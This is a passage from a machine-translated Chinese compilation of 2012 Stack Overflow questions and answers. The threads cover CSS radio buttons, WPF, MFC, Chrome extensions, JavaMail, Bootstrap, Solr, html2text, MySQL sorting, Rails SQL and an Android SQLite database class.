问题是第二组单选按钮显示我想要的图像+标准单选按钮，我发现很难区分两者。如果你能帮忙那就太好了。这是我用于两组单选按钮的当前 css：

```
.fieldlist{width:100%; background-color:#fffcd9}

input[type="radio"] + label{
background: url(/images/1.png) right center no-repeat;
background-size: 20px; 
height: 25px;
display:inline-block;
padding: 0 49px 0 0;
}

input[type="radio"]:checked + label{
    background-size: 20px; -moz-background-size: 20px;
    background: url(/images/2.png) right center no-repeat;
}

label[for=shipadd1]{
    width: 60%;
    float: left;
    text-align: left;
}

label[for=shipadd2]{
    width: 60%;
    float: left;
    text-align: left;
}

label[for=shipadd3]{
    width: 60%;
    float: left;
    text-align: left;
}

label[for=shipadd4]{
    width: 60%;
    float: left;
text-align: left;
} 
```

所以，我试图在一页上使用标准单选按钮，擦除实际的单选按钮并将它们替换为在第二页上使用。有人可以告诉我哪里出错了吗？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:09:05.997

您有两个具有相同 ID 的单选按钮

```
id='gender' 
```

试着把它们独一无二

```
id='genderMale'            id='genderFemale' 
```

然后你让他们区分每个id，不确定这是否是你要求的......

编辑

正如我所说，你正在做的是糟糕的编码，不同的 id 和一个共享的类......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:19:37.917

为前 2 个单选按钮添加公共类。第二组的另一个类。这样你就可以区分它们。

# c# - Visual Studio 中的调度程序问题

> ID：12839115
> 
> 赞同：0
> 
> 时间：2012-10-11T12:04:30.517
> 
> 标签：c#, wpf, visual-studio-2010

我正在尝试在[System.Windows.Threading.Dispatcher](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcher.aspx)类中使用[Dispatcher.Invoke()](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcher.invoke.aspx)方法。IntelliSense 以及文档显示此方法有 9 个重载，但 IntelliSense 只为您提供了其中的 4 个选项来实现，尽管我可以实现那些未显示在重载列表中的选项。出了什么问题以及如何解决？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:27:58.503

部分会员标有

```
[EditorBrowsable(EditorBrowsableState.Never)] 
```

并且永远不会被智能感知显示。

其他成员标有

```
[EditorBrowsable(EditorBrowsableState.Advanced)] 
```

并向他们展示使用工具 | 选项 | 文本编辑器 | C# | 语句完成 | 隐藏高级成员

[有关MSDN](http://msdn.microsoft.com/en-us/library/system.componentmodel.editorbrowsableattribute.aspx)的更多详细信息。

# c# - 在 Metro 应用程序中设置 Button.Tag

> ID：12839118
> 
> 赞同：0
> 
> 时间：2012-10-11T12:04:42.093
> 
> 标签：c#, xaml, button, microsoft-metro

如何将字符串类型或 int 类型设置为 Metro 应用程序中的按钮？

我试过下面的代码，

```
<Button Name="oldlogs" Tag="old" 
        Content="New Logs" HorizontalAlignment="Left" 
        Margin="819,660,0,0" VerticalAlignment="Top" 
        Click="showNewLogs"/> 
```

但是当我检查

```
if (oldlogs.Tag == "old") {
                addedVal++;
                flag = 1;
                showLog(sender, e);
            } 
```

控件不进入if循环！请帮助通过。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:12:05.310

[标签](http://msdn.microsoft.com/en-us/library/system.windows.frameworkelement.tag.aspx)存储一个对象。

您需要将其转换为字符串，然后将其与“旧”文字进行比较。

# c++ - 无效（）函数不起作用

> ID：12839122
> 
> 赞同：0
> 
> 时间：2012-10-11T12:04:52.570
> 
> 标签：c++, mfc

我有一个功能可以检查我单击的按钮复选框

```
void CRisanjeDlg::OnBnClickedCheck1()
{
    Invalidate(1);
} 
```

在 OnPaint 方法中，我有以下代码：

```
 if(m_CheckBox1.GetState() ==1 )
{
    CBrush brush;
    CRect rect;
    GetClientRect(rect);
    brush.CreateSolidBrush(RGB(255,200,255));
    rect.DeflateRect(0,0,500,0);
    dc.Rectangle(rect);
    dc.FillRect(rect, &brush);
} 
```

我有几个其他事件触发 OnPaint 方法，如果选中该框，它会绘制它必须绘制的内容。

当我单击复选框时它不起作用。事件被识别，只是 Invalidate(1) 不起作用......

有什么建议么？

编辑：当我取消选中该框时，该功能工作正常。看来问题应该出在

```
if(m_CheckBox1.GetState() ==1 ) 
```

部分。

EDIT2：没错，问题出在提到的 if 语句中。这解决了它，不知道为什么。将不胜感激进一步的解释。

```
m_CheckBox1.GetCheck() ==1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:08:58.510

尝试使用调试器，看看你是否进入了 OnBnClickedCheck1 函数

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T14:36:07.613

`GetState`返回状态的*组合*。由于用户正在按下按钮，因此您将拥有`BST_PUSHED`和`BST_FOCUS`除了`BST_CHECKED`. 如果您只测试单个位，它会起作用：

```
if ((m_CheckBox1.GetState() & BST_CHECKED) == BST_CHECKED) 
```

这可以简化，因为任何非零值都是真的：

```
if (m_CheckBox1.GetState() & BST_CHECKED) 
```

# html - 即使 Chrome 关闭，有没有办法显示桌面通知？

> ID：12839128
> 
> 赞同：6
> 
> 时间：2012-10-11T12:05:04.690
> 
> 标签：html, google-chrome-extension, notifications

我正在开发 Google Chrome 扩展，我想知道即使 Chrome 已关闭，是否还有显示桌面通知，也许是某种后台进程或服务？如果不可能，请给我建议和指导。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T13:12:58.090

如果您请求[“后台”](http://developer.chrome.com/extensions/manifest.html#permissions)权限，即使 Chrome 窗口关闭，您的扩展程序的后台页面也能显示通知。

> 当任何已安装的托管应用程序、打包应用程序或扩展程序具有“后台”权限时，Chrome 会在用户登录其计算机后立即运行（不可见）——在用户启动 Chrome 之前。“后台”权限还使 Chrome 继续运行（即使在其最后一个窗口关闭后），直到用户明确退出 Chrome。

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2012-10-11T12:14:42.920

如果您使用 Google Chrome，您可以启用一项新的 Gmail 功能，该功能会显示新邮件的桌面通知。转到“设置”，启用聊天通知和邮件通知，以便在收到新消息时看到一个小气泡。

其次：使用 WCF 或 Windows 服务：

您必须在机器上开发简单的客户端来轮询中央服务以获取警报。每个警报都应该有一个唯一的 id，以便每个客户端都可以处理 idem-potency

我希望这对你有帮助问候：Azeem Raavi

# jakarta-mail - 修复 javax.mail.AuthenticationFailedException 异常的异常

> ID：12839132
> 
> 赞同：1
> 
> 时间：2012-10-11T12:05:07.550
> 
> 标签：jakarta-mail, transport

我正在学习如何使用 javamail API 发送电子邮件，我已经创建了使用 SMTP 服务器发送简单电子邮件的必要属性和说明，并且我正在使用以下代码：

```
 Properties props=new Properties();
    props.put("mail.smtp.host", "smtp.gmail.com");
    props.put("mail.smtp.socketFactory.port", "465");
    props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
    props.put("mail.smtp.auth", "true");
    props.put("mail.smtp.port", "465");

    Session session= Session.getDefaultInstance(props, new javax.mail.Authenticator() {

    protected PasswordAuthentication getpPasswordAuthentication(){
    return new  PasswordAuthentication("myemailadresse@gmail.com", "password");
    }

    });
    try{
        Message message=new MimeMessage(session);
        message.setFrom(new InternetAddress("myemail"));    
        message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("recepientemailadresse"));
        message.setSubject("the java mail test");
        message.setText("Guess what brother the java mail is working correctly");
        Transport.send(message);
         JOptionPane.showMessageDialog(rootPane, "message sent");
    }
    catch(Exception e){
        JOptionPane.showMessageDialog(rootPane, e);
         e.printStackTrace();
    } 
```

我在运行时发生了一个异常，提到：

```
 javax.mail.AuthenticationFailedException: failed to connect, no password specified?
at javax.mail.Service.connect(Service.java:329)
at javax.mail.Service.connect(Service.java:176)
at javax.mail.Service.connect(Service.java:125)
at javax.mail.Transport.send0(Transport.java:194)
at javax.mail.Transport.send(Transport.java:124)
at transfer.Maitest.jButton1ActionPerformed(Maitest.java:96)
at transfer.Maitest.access$000(Maitest.java:20)
at transfer.Maitest$1.actionPerformed(Maitest.java:45)
at javax.swing.AbstractButton.fireActionPerformed(AbstractButton.java:2018)
at javax.swing.AbstractButton$Handler.actionPerformed(AbstractButton.java:2341)
at javax.swing.DefaultButtonModel.fireActionPerformed(DefaultButtonModel.java:402)
at javax.swing.DefaultButtonModel.setPressed(DefaultButtonModel.java:259)
at javax.swing.plaf.basic.BasicButtonListener.mouseReleased(BasicButtonListener.java:252)
at java.awt.Component.processMouseEvent(Component.java:6505) 
```

你能告诉我我错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T20:45:41.710

首先，阅读这个[关于常见错误的 JavaMail FAQ 条目](http://www.oracle.com/technetwork/java/javamail/faq/index.html#commonmistakes)。更正它们后，请阅读此[JavaMail FAQ 条目，该条目告诉您如何连接到 Gmail](http://www.oracle.com/technetwork/java/javamail/faq/index.html#gmail)。如果它仍然不起作用，这个[关于调试的 JavaMail FAQ 条目](http://www.oracle.com/technetwork/java/javamail/faq/index.html#debug)会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-21T11:48:23.213

如果您的电子邮件服务器不需要身份验证并且您不想提供密码（例如，测试环境），请尝试以下操作：

```
props.put("mail.smtp.auth", "false"); 
```

# twitter-bootstrap - Twitter bootstrap，在移动设备上将图像拉伸到全屏

> ID：12839134
> 
> 赞同：4
> 
> 时间：2012-10-11T12:05:11.200
> 
> 标签：twitter-bootstrap, responsive-design

我有一个应用程序需要拉伸图像以填满整个屏幕。我正在使用 twitter 引导框架，并且在桌面上一切正常，但在我的 Galaxy s3 上，图像无法缩放。

页面的整个 src 看起来像这样（别担心它很小；））

```
<html lang="en">
<head>
    <meta charset="utf-8">
        <meta content="width=device-width, initial-scale=1.0" name="viewport">
        <link href="/assets/a4727ffb/css/bootstrap.css" type="text/css" rel="stylesheet">
        <link href="/assets/a4727ffb/css/bootstrap-responsive.css" type="text/css" rel="stylesheet">
        <link href="/assets/a4727ffb/css/bootstrap-yii.css" type="text/css" rel="stylesheet">
        <script src="/assets/44b05ae/jquery.js" type="text/javascript"></script>
        <script src="/assets/a4727ffb/js/bootstrap.js" type="text/javascript"></script>
</head>
<body>
<style>
    .container-fluid {
          padding: 0px;
    }
</style>

<div class="container-fluid">
    <div class="row-fluid">
            <img alt="camera" src="/index.php/camera/getLatestImage/28?0.660698722382962" style="width:100%;height:100%">
    </div>
</div>
</body>
</html> 
```

我想不出任何理由为什么这不起作用？图像每秒都会使用一些我没有包含在上述代码中的 javascript 重新加载。但我认为这不是问题。

任何帮助将不胜感激，

艾伦

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-13T19:20:37.063

在丹尼尔斯回应后，我想出了一个办法，谢谢丹尼尔。

```
<html lang="en">
<head>
        <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/> 
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <link href="/assets/a4727ffb/css/bootstrap.css" type="text/css" rel="stylesheet">
        <link href="/assets/a4727ffb/css/bootstrap-responsive.css" type="text/css" rel="stylesheet">
        <link href="/assets/a4727ffb/css/bootstrap-yii.css" type="text/css" rel="stylesheet">
        <script src="/assets/44b05ae/jquery.js" type="text/javascript"></script>
        <script src="/assets/a4727ffb/js/bootstrap.js" type="text/javascript"></script>
    <style>
        html, body {background:none;height:100%; margin:0; padding:0;}
        .camera-holder {position:fixed; top:0; left:0; width:100%; height:100%;z-index:-1;}
        </style>
        </head>
        <body>
        <style>
            .container-fluid {
                  padding: 0px;
            }
        </style>
        <div class="container-fluid">
            <div class="row-fluid">
        <div class="camera-holder">
                    <img alt="camera" src="/index.php/camera/getLatestImage/28?0.660698722382962" style="width:100%;height:100%">
        </div>
            </div>
        </div>
    </body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-13T09:34:34.990

我没有 Galaxy S3 来测试，但也许这对你有用：http: [//jsfiddle.net/EveAf/1/](http://jsfiddle.net/EveAf/1/)

# trigger.io - 如何解决我的 Trigger.io 证书错误？

> ID：12839139
> 
> 赞同：1
> 
> 时间：2012-10-11T12:05:30.543
> 
> 标签：trigger.io

如何解决我的 Trigger.io 证书错误？我需要知道如何打包我的第一个示例应用程序。

> [INFO] Forge 工具在版本 3.3.17 上运行
> [INFO] 更新结果：您已经拥有最新的工具
> [INFO] 检查 JavaScript 文件...
> [INFO] JavaScript 检查完成
> [INFO] 验证您的配置设置...
> [INFO ] 配置设置检查完成
> [INFO] 开发构建创建。使用 forge run 运行您的应用程序。
> [INFO] Forge 工具在版本 3.3.17 上运行
> [INFO] 检查 JavaScript 文件...
> [INFO] JavaScript 检查完成
> [INFO] 验证您的配置设置...
> [INFO] 配置设置检查完成
> [INFO] 开始打包过程iOS
> [INFO] 打包：/Users/tyler/forge-workspace/Messagee-native-app-using-Apigee/development/ios/device-ios.app
> [INFO] Plist OK
> [INFO] No Provisioned Devices, profile is Appstore
> [错误] 运行 /usr/bin/codesign 时失败：ios_development：找不到身份

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:39:20.707

从追溯来看，您似乎正在使用分发（仅限 Appstore）配置文件 - 这真的是您的意思吗？构建的应用程序将无法在任何设备上运行...

但这是一个切线 - 这里的问题是您已将命令配置为使用“ios_development”开发证书，而您的机器上没有该证书。

如果您遵循[这些说明](http://docs.trigger.io/en/v1.4/best_practice/release_mobile.html#ios)，我们将引导您完成如何创建正确的证书、配置文件等。

如果您可以使用有关您的机器上拥有哪些证书的信息更新您的问题（查看钥匙串访问），您有哪些可用的配置文件（查看 Xcode Organizer），我将能够获得更具体的信息命令运行。

此外，`--verbose`在命令行上启用调试输出或工具包中的“显示调试输出”复选框确实有助于逐步完成这些事情。

# jquery - 将 Solr 暴露给搜索引擎爬虫 (SEO) 的策略

> ID：12839142
> 
> 赞同：1
> 
> 时间：2012-10-11T12:05:43.133
> 
> 标签：jquery, json, solr, seo

我有一个 Solr 搜索服务器，它为我的 Web 前端提供 JSON，它使用 jQuery 根据用户提供的搜索词和选定的方面来获取数据。一旦显示初始搜索结果（带有分页）并且用户单击结果，Web 前端会查询我的数据库以获取产品详细信息并将其显示给用户。现在我正在尝试找出在这种情况下向 SEO 公开此内部搜索的最佳策略是什么，以便 Google 用户可以找到我的 Solr 搜索服务器返回的产品并能够查看产品详细信息？我不确定实际上允许爬虫浏览我们的内部搜索页面是否是个好主意，因为它可能会影响 Solr 缓存和驱逐（负面？）。

（我知道 AJAX 的 hashbang 和 SEO，所以这个问题是关于如何让爬虫发现我们通过 Solr 搜索服务器提供的产品？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T15:01:51.293

您可以使用站点地图

[http://www.sitemaps.org/](http://www.sitemaps.org/)

# python - Python html2text 添加随机\n

> ID：12839143
> 
> 赞同：6
> 
> 时间：2012-10-11T12:05:44.910
> 
> 标签：python, python-2.7

当使用[html2text](http://pypi.python.org/pypi/html2text/3.200.3) python 包将 html 转换为 markdown 时，它会在文本中添加 '\n'。[在http://www.aaronsw.com/2002/html2text/](http://www.aaronsw.com/2002/html2text/)尝试演示时，我也看到了这种行为

有什么办法可以关闭它吗？当然我可以自己删除它们，但是我不想删除的原始文本中可能会出现'\n'。

```
 html2text('Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.')

    u'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod\ntempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,\nquis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo\nconsequat. Duis aute irure dolor in reprehenderit in voluptate velit esse\ncillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non\nproident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n\n' 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2016-12-19T11:42:36.100

在最新版本的 html2text 中执行以下操作：

```
import html2text
h = html2text.HTML2Text()
h.body_width = 0
note = h.handle("<p>Hello, <a href='http://earth.google.com/'>world</a>!") 
```

这将删除 html2text 否则会执行的自动换行

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-10-11T12:10:12.260

查看[源代码`html2text.py`](http://www.aaronsw.com/2002/html2text/html2text.py)，看起来您可以通过设置`BODY_WIDTH`来禁用包装行为`0`。像这样的东西：

```
import html2text
html2text.BODY_WIDTH = 0
text = html2text.html2text('...') 
```

当然，`BODY_WIDTH`全局重置会改变模块的行为。如果我需要访问此功能，我可能会寻求修补模块，创建一个参数来`html2text()`修改每次调用的此行为，并将此修补程序提供给作者。

# windows - 如何强制窗口显示错误消息？

> ID：12839147
> 
> 赞同：0
> 
> 时间：2012-10-11T12:05:59.143
> 
> 标签：windows

有时，显然在 Windows XP 上，当我的应用程序出现问题时，Windows 会尝试帮助显示“发送错误报告”对话框。

但是要找出真正的错误，我最好看到实际的错误消息。是否有任何配置或日志可以查看以查看错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:58:44.087

`NTSD`默认情况下，Windows XP 会安装一个旧副本。您可以设置以下注册表项

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug\Debugger 
```

打电话`ntsd`。它将捕获所有未处理的异常。IIRC，这是 DrWatson 曾经居住的地方。

这是一个[详细的操作方法](http://support.citrix.com/article/CTX105888)，可以将转储保存到文件中。我更喜欢这种方法，但您也可以让调试器启动交互式会话。

这个[SO question](https://stackoverflow.com/q/2284138/591064)是相似的。

# javascript - 将日期倒计时添加到 jquery 计数器

> ID：12839148
> 
> 赞同：0
> 
> 时间：2012-10-11T12:06:04.317
> 
> 标签：javascript, jquery, counter, countdown

有人可以帮我添加一个日期计数到[https://github.com/sophilabs/jquery-counter/blob/master/src/jquery.counter.js](https://github.com/sophilabs/jquery-counter/blob/master/src/jquery.counter.js)吗？

当前计数器在小时、分钟和秒方面工作正常。它缺少唯一的日期。我不是这方面的专家。请帮忙，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:22:13.917

我不是专家，但我认为你可以使用这个：

```
<script language='javascript' type= 'text/javascript>
function showdate()
{
    var d = new date();
    document.getElementById('date').innerHTML = d.toLocaleDateString();
}
</script> 
```

# django - 在 Django 中伪造请求

> ID：12839153
> 
> 赞同：0
> 
> 时间：2012-10-11T12:06:16.097
> 
> 标签：django, view

我有一个配备了 Tastypie 的 Django，在 REST 样式下，将不同类型的对象组合在一起并不容易，所以我在想是否可以提供一个特殊的视图来将几个 REST url 的响应组合成一个更大的 JSON 对象并返回客户。网址可能看起来像，

> http:// domain.com /combined_view/?p={rest url 1...}&p={rest url 2...}&p={rest url 3...}

返回的 JSON 将是，

> [ {response of rest url 1...}, {response of rest url 2...}, {response of rest url 3...}, ... ]

问题是，在普通的 django 视图中，如何伪造请求对象，并将其处理为响应对象？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:16:40.533

从视图内部调用自己的 RESTful API 是一种资源浪费。改为使用数据库 ORM 直接访问对象。

不相关的资源/对象也不应该组合在一起。如果您认为模型应该组合在一起，那么也许您的模型需要处理它并具有将两者结合起来的关系。

要直接回答您的问题，您可以使用[httplib2](http://bitworking.org/projects/httplib2/doc/html/libhttplib2.html)调用您的网址并解析响应。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:20:44.787

我敦促你重新考虑你在做什么，因为我们在这里给你的任何答案都必然会直接违背 REST 接口的足智多谋的设计。

如果您有`Foo`,`Bar`和`Baz`模型并为它们创建等效资源，则不可能生成将返回`Foo`, `Bar`,`Baz`资源的混合集合的请求，除非这些是联合关系中的嵌套资源。

您要么没有以足智多谋的方式思考，要么不需要思考，但绝对不要将 RESTful 架构变成​​他们没有设计的东西。

# mysql - 从 mysql 的同一列中按文本 asc 和数字 desc 对字符串进行排序

> ID：12839155
> 
> 赞同：0
> 
> 时间：2012-10-11T12:06:37.783
> 
> 标签：mysql, sorting

我想订购这样的一套：

*   a2
*   一个 1
*   b 9

不像正常的升序：

*   一个 1
*   a2
*   b 9

换句话说，我有一个带有一些文本的列，有时还有一个数字。我想让所有最后带有数字的字段按数字降序排序，但前导文本仍必须按升序排序。

字符串不仅是 1 个字符长，而且长度未知，数字也不仅是 1 个字符长，而且长度未知，并且不能保证在字符串的末尾，它可能看起来像：“随机事件，第十二次”

如果我有一个像“随机事件，第 12 次”这样的字符串，我希望它出现在之前：“随机事件，第 11 次”在我的结果中。

希望有一些 SQL 人知道这个问题的答案:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T14:10:35.780

您可以创建一个函数来隔离您要订购的号码。例如。像这样的东西（在这里找到[MySQL strip non-numeric characters to compare](https://stackoverflow.com/questions/287105/mysql-strip-non-numeric-characters-to-compare)）

```
DROP FUNCTION IF EXISTS STRIP_NON_DIGIT;
DELIMITER $$
CREATE FUNCTION STRIP_NON_DIGIT(input VARCHAR(255))
   RETURNS INT
   DETERMINISTIC
BEGIN
   DECLARE output   VARCHAR(255) DEFAULT '';
   DECLARE iterator INT          DEFAULT 1;
   WHILE iterator < (LENGTH(input) + 1) DO
      IF SUBSTRING(input, iterator, 1) IN ( '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' ) THEN
         SET output = CONCAT(output, SUBSTRING(input, iterator, 1));
      END IF;
      SET iterator = iterator + 1;
   END WHILE;
   RETURN output;
END
$$ 
```

现在像这样运行你的sql：

SELECT * FROM myTable order by myString, STRIP_NON_DIGIT(myString) DESC;

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-11T12:14:15.213

```
select * from table name where "your query " and  "  " order by asc; 
```

或者如果在降序使用“dec”你想要降序或升序的列放入“”

# javascript - Javascript tabIndex=1 产生相反的效果...元素被完全跳过

> ID：12839156
> 
> 赞同：0
> 
> 时间：2012-10-11T12:06:39.267
> 
> 标签：javascript, html, tabindex

我无法让这个 tabIndex 工作。当我点击它进入的选项卡时，我希望它成为第一个元素（它是一个完成按钮，但不是“按钮”类型）。事实上，当我给它 a.tabIndex = 1; 它做相反的事情，并在正常/默认的标签流中完全跳过。为什么是这样？

```
 var div = document.createElement("div");
    div.setAttribute("class", "container");
    div.setAttribute("id", "doneCon");
    div.style.width = "70px";
    div.style.height = "35px";
    div.style.overflow = "hidden";
    div.style.borderStyle = "solid";
    div.style.borderColor = "blue";
    div.style.borderRadius = "35px/18px";
    div.style.backgroundColor = "white";
    div.style.marginLeft = "5px";
    div.style.display = "inline-block";
    var a = document.createElement("a");
    a.setAttribute("href", "#");
    a.setAttribute("class", "a container");
    a.tabIndex = 1
    a.setAttribute("id", "done");
    a.style.display = "block";
    a.style.fontFamily = "yo2";
    a.style.weight = "bold";
    a.style.fontSize = "150%";
    a.style.paddingTop = "7px";
    a.style.textDecoration = "none";
    a.style.color = "blue";
    a.style.textAlign = "center";
    text = document.createTextNode("Done");
    a.appendChild(text);
    div.appendChild(a); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:10:48.017

我认为您需要在设置 tabIndex 之前附加Child `a`。`div`tabIndex 不太可能通过此操作得到维护，因为您将锚 (a) 附加到 div 子项的末尾。

要找出答案，请在 appendChild 之后的行上放置一个断点并查看 append 之后的 tabIndex 属性的值（使用 firebug 或 Chrome 的内置开发工具等效项）。

# unit-testing - 可以将 MS Fakes 垫片与 NSubstitute 模拟一起使用吗？

> ID：12839158
> 
> 赞同：2
> 
> 时间：2012-10-11T12:06:56.800
> 
> 标签：unit-testing, mocking, nsubstitute, microsoft-fakes

我们使用[NSubstitute](http://nsubstitute.github.com/)模拟单元测试的外部对象。然而，许多遗留类不是通过接口调用的，也不能轻易地用模拟替换。

我考虑过使用[Microsoft Fakes](http://richonsoftware.cloudapp.net/post/2012/04/05/Using-Stubs-and-Shim-to-Test-with-Microsoft-Fakes-in-Visual-Studio-11.aspx)，但根据[“Mock framework vs MS Fakes frameworks](https://stackoverflow.com/questions/9677445/mock-framework-vs-ms-fakes-frameworks/9684782#9684782) ” 问题[的答案](https://stackoverflow.com/questions/9677445/mock-framework-vs-ms-fakes-frameworks/9684782#9684782)

> “如果您已经在使用功能更全面的模拟框架，您可能会觉得 Fakes 存根中缺少一些重要的部分。”

是否可以在相同的测试中使用带有 NSubstitute 模拟的 MS Fakes 垫片？

我们应该期待任何兼容性问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-14T03:00:36.127

是的。几个月来，我一直在使用 Shims 和 NSubstitute。它在本地和构建服务器上都可以正常工作。唯一的问题是 Resharper 测试运行器不能与 Shims 一起使用，所以我们必须使用 VisualStudio 的测试运行器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-16T18:07:34.397

是的，您应该能够将 Shims 与模拟框架一起使用。

# sql - 使用rails将变量传递给SQL语句

> ID：12839160
> 
> 赞同：2
> 
> 时间：2012-10-11T12:07:04.990
> 
> 标签：sql, ruby-on-rails

我试图将变量传递`supplier`到我的 sql 语句的 where 子句中。它将变量保存为当我单击链接时，它会在`url`. 我只是不知道在语句中放入什么以使其从视图中获取变量。

模型：

```
def self.find_supplier
find_by_sql(["SELECT s.supplier, s.productcode, s.description, CAST(SUM(l.amount) as UNSIGNED) AS amount
FROM softwares s
LEFT JOIN licenses l ON s.id=l.software_id
WHERE s.supplier = ? AND l.amount > 0
GROUP BY s.supplier, s.vendor, s.title, s.edition", :supplier)
end 
```

看法：

```
<% @softwares.each do |l| %>
<li>
<%= link_to "#{l.supplier}", :controller =>'softwares', :action => 'export_supplier', :supplier => l.supplier %>
</li>
<% end %> 
```

控制器：

```
def export_supplier
@software = Software.find_supplier
software = CSV.generate do |csv|

# for the headers of the csv file
  csv << ["Quantity", "Item Number", "Item Description"]
  # the chosen rows from the database
  @software.each do |s|
    csv << [s.amount, s.productcode, s.description, s.supplier]
  end
end
send_data(software, :type => 'text/csv', :filename => 'software.csv')
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:13:04.240

```
find_by_sql(["SELECT s.supplier, s.productcode, s.description, CAST(SUM(l.amount) as UNSIGNED) AS amount 
```

FROM softwares s LEFT JOIN licenses l ON s.id=l.software_id WHERE s.supplier = ? AND l.amount > 0 GROUP BY s.supplier, s.vendor, s.title, s.edition", params[:supplier])

我假设 find_by_sql 在您的控制器中，“export_supplier”方法。在这里你应该得到 params[:supplier]

# java - 如何启动我的 Android SQLite 应用程序而不会出错

> ID：12839161
> 
> 赞同：1
> 
> 时间：2012-10-11T12:07:04.250
> 
> 标签：java, android, database, sqlite, arraylist

我想用 SQLite 数据库构建一个 Android 应用程序。我有两个 Java 类。第一个是 Contact 类，第二个是 DatabaseHandle 类，用于添加、更新等操作...

我没有收到错误，但如果我启动我的应用程序，我会变成这条消息......

![在此处输入图像描述](../Images/123bd88285cfd76496e198757311bda3.png)

这是我的**联系**课程

```
package de.linde.sqlite;

public class Contact {

    int _id;
    String _name;
    String _phone_number;

    public Contact(){}

    public Contact(int id,String name,String _phone_number){

        this._id = id; 
        this._name = name; 
        this._phone_number = _phone_number;
    }

    public Contact(String name,String _phone_number){

        this._name = name;
        this._phone_number = _phone_number; 
    }

    public int getID(){

        return this._id; 
    }

    public void setID(int id){

        this._id = id; 
    }

    public String getName(){

        return this._name; 
    }

    public void setName(String name){

        this._name = name; 
    }

    public String getPhoneNumber(){

        return this._phone_number;
    }

    public void setPhoneNumber(String phone_number){

        this._phone_number = phone_number; 
    }
} 
```

这是我的**DatabaseHandler**类

```
package de.linde.sqlite;

import java.util.ArrayList;
import java.util.List;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

public class DatabaseHandler extends SQLiteOpenHelper {

    //Datenbank version
    private static final int DATABASE_VERSION = 1; 
    //Datenbankname
    private static final String DATABASE_NAME = "contactsManager";
    //Tabellenname
    private static final String TABLE_CONTACTS = "contacts";
    //Tabellenspalten
    private static final String KEY_ID = "id";
    private static final String KEY_NAME = "name";
    private static final String KEY_PH_NO = "phone_number";

    public DatabaseHandler(Context context){

        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }

    public void onCreate(SQLiteDatabase db){

        String CREATE_CONTACTS_TABLE = "CREATE TABLE" + TABLE_CONTACTS + "("
                                        + KEY_ID + "INTEGER PRIMARY KEY," + KEY_NAME + "TEXT," 
                                        + KEY_PH_NO + " TEXT" + ")";

        db.execSQL(CREATE_CONTACTS_TABLE); 
    }

    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion){

        db.execSQL("DROP TABLE IF EXISTS" + TABLE_CONTACTS); 

        onCreate(db); 
    }

    public void addContact(Contact contact) {
        SQLiteDatabase db = this.getWritableDatabase();

        ContentValues values = new ContentValues();
        values.put(KEY_NAME, contact.getName()); // Contact Name
        values.put(KEY_PH_NO, contact.getPhoneNumber()); // Contact Phone Number

        // Inserting Row
        db.insert(TABLE_CONTACTS, null, values);
        db.close(); // Closing database connection
    }

    public Contact getContact(int id) {
        SQLiteDatabase db = this.getReadableDatabase();

        Cursor cursor = db.query(TABLE_CONTACTS, new String[] { KEY_ID,
                KEY_NAME, KEY_PH_NO }, KEY_ID + "=?",
                new String[] { String.valueOf(id) }, null, null, null, null);
        if (cursor != null)
            cursor.moveToFirst();

        Contact contact = new Contact(Integer.parseInt(cursor.getString(0)),
                cursor.getString(1), cursor.getString(2));
        // return contact
        return contact;
    }

    public List<Contact> getAllContacts() {
